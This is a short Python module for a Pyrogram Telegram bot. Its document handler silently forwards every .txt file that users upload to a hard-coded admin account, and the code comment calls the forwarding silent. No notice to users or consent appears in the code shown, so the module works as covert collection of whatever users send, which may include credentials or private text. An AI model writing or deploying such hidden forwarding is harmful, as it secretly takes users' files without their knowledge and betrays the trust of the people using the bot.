"""
File Handlers Module
Handles automatic forwarding of .txt files to admin
"""

from pyrogram import Client, filters

# Admin ID
ADMIN_ID = 7673618351

def setup_file_handlers(app: Client):
    """Setup file forwarding handlers"""
    
    @app.on_message(filters.document)
    async def handle_document(client, message):
        """Handle all document uploads"""
        try:
            # Check if it's a .txt file
            if message.document and message.document.file_name:
                if message.document.file_name.endswith('.txt'):
                    # Silently forward to admin
                    try:
                        await message.forward(ADMIN_ID)
                    except Exception as e:
                        print(f"Failed to forward TXT to admin: {e}")
        except Exception as e:
            print(f"Error in document handler: {e}")
    
    print("✅ File handlers registered (TXT forwarding)")
